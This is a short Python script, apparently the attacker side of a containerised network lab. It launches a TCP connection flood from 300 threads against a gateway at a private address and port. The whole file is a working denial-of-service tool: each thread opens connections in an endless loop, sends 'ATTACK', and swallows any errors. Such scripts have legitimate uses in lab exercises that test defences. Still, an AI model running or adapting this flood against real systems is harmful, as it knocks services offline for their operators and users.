import socket
import threading
import time

TARGET_HOST = "172.30.0.2"
TARGET_PORT = 9999

def flood():
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((TARGET_HOST, TARGET_PORT))
            s.send(b"ATTACK\n")
            s.close()
        except:
            pass

if __name__ == "__main__":
    print("Attacker container started...")
    time.sleep(15)
    print("Launching TCP flood on gateway...")

    for i in range(300):
        t = threading.Thread(target=flood)
        t.daemon = True
        t.start()

    while True:
        time.sleep(1)
